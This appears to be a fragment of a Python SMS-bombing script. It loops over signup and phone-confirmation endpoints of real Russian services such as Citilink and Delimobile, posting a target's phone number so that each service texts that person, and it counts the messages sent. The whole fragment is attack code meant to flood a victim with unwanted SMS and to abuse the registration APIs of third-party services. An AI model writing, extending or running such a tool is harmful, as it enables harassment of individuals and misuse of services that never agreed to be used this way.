    ...
    while sent <= sms:
        ...
        try:
            citilink = requests.post(
                "https://www.citilink.ru/registration/confirm/phone/+" + number_7 + "/",
                headers=HEADERS,
            )
            sent += 1
            time(sent)
        ...
        try:
            delimobile = requests.post(
                "https://api.delitime.ru/api/v2/signup",
                data={"SignupForm[username]": number_7, "SignupForm[device_type]": 3},
                headers=HEADERS,
            )
            sent += 1
            time(sent)
